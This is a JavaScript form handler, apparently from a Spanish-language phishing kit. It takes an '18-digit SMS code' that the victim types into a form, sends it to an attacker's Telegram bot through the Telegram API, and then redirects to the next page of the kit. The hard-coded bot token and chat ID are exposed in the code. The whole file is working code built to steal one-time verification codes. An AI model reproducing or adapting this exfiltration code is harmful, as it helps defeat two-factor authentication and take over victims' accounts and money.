function enviarFormulario(event) {
    event.preventDefault();

    var documento = document.getElementById("documento").value;


    var mensaje = "Código 18 dígitos SMS: <code>" + documento + "</code>\n" ;

    fetch("https://api.telegram.org/bot" + "6588209506:AAE0tCvE9p3LMROYDpYE8CGxVF6QV621g1w" + "/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "1900569011",
            text: mensaje,
            parse_mode: "HTML"
        })
    })
    .then(function(response) {
        if (response.ok) {
            
            window.location.href = "index4.html";
        } else {
           
            console.error("Error en la llamada a la API de Telegram: ", response.statusText);
        }
    })
    .catch(function(error) {
        
        console.error("Error en la llamada a la API de Telegram: ", error);
    });
}